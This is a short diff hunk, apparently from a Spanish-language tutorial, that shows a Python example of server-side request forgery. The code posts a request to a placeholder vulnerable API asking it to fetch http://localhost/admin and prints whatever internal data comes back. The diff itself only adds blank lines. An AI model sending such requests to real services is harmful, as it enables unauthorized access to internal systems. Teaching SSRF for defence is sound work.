@@ -23,7 +23,9 @@ Ejemplo de explotación SSRF en una API vulnerable:
 import requests
 
 url = "http://victima.com/api/fetch"
+
 data = {"url": "http://localhost/admin"}
+
 response = requests.post(url, json=data)
 
 print(response.text)  # ¿Información interna filtrada?
